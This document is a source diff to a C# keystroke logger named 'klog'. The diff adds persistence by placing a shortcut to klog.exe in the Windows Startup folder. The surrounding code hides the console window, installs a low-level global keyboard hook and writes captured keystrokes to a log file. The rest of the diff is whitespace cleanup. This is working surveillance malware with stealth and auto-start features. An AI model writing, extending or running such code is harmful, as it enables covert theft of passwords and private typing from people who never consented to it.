@@ -2,6 +2,8 @@
 using Windows.Win32;
 using Windows.Win32.Foundation;
 using Windows.Win32.UI.WindowsAndMessaging;
+using IWshRuntimeLibrary;
+using File = System.IO.File;
 
 namespace klog;
 
@@ -28,6 +30,7 @@ public static class Program
     {
         HideWindow();
         WriteInfoToLogFile();
+        AddToStartup();
 
         // write buffer on process exit
         AppDomain.CurrentDomain.ProcessExit += (_, _) =>
@@ -36,14 +39,14 @@ public static class Program
             WriteBuffer();
             Writer.Dispose();
         };
-        
+
         // TODO check something weird going on
         _capsLockActive = Keyboard.GetCapsLockState();
 
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
             WINDOWS_HOOK_ID.WH_KEYBOARD_LL, KeyboardProcedure, null, 0);
-        
+
         // set up message queue
         MSG msg = new();
         while (PInvoke.GetMessage(&msg, new HWND(), 0, 0))
@@ -52,7 +55,7 @@ public static class Program
             PInvoke.DispatchMessage(msg);
         }
     }
-    
+
     /// <summary>
     /// Logs key presses to a file. Meant to be used with SetWindowsHookEx.
     /// </summary>
@@ -254,7 +257,7 @@ public static class Program
         // if caps lock or shift were pressed, set their fields
         if (kbStruct->vkCode == 0x14) _capsLockActive = !_capsLockActive;
         if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = true;
-        
+
         // check for letters
         if (kbStruct->vkCode >= 0x41 && kbStruct->vkCode <= 0x5A)
         {
@@ -280,7 +283,7 @@ public static class Program
             0xA5 => " [RIGHT ALT UP] ",
             _ => ""
         };
-        
+
         // checking for shift keyup
         if (kbStruct->vkCode == 0xA0 || kbStruct->vkCode == 0xA1) _shiftActive = false;
 
@@ -322,7 +325,7 @@ public static class Program
         Writer.Flush();
         Buffer.Clear();
     }
-    
+
     /// <summary>
     ///     Asynchronously writes <see cref="Buffer"/> to <see cref="PathToFile">the log file</see> using the <see cref="Writer"/>
     /// </summary>
@@ -364,7 +367,7 @@ public static class Program
                           $"as well as what was typed in while those were active.\n\n");
         Writer.Flush();
     }
-    
+
     /// <summary>
     ///     Hides current console window.
     /// </summary>
@@ -372,5 +375,18 @@ public static class Program
     {
         var hWnd = PInvoke.GetConsoleWindow();
         PInvoke.ShowWindow(hWnd, SHOW_WINDOW_CMD.SW_HIDE);
+    }
+
+    private static void AddToStartup()
+    {
+        var startupFolderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+        var shortcutPath = Path.Combine(startupFolderPath, "klog.lnk");
+        var path = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "klog.exe");
+
+        if (File.Exists(shortcutPath)) return;
+        var wsh = new WshShell();
+        if (wsh.CreateShortcut(shortcutPath) is not IWshShortcut shortcut) return;
+        shortcut.TargetPath = path;
+        shortcut.Save();
     }
 }
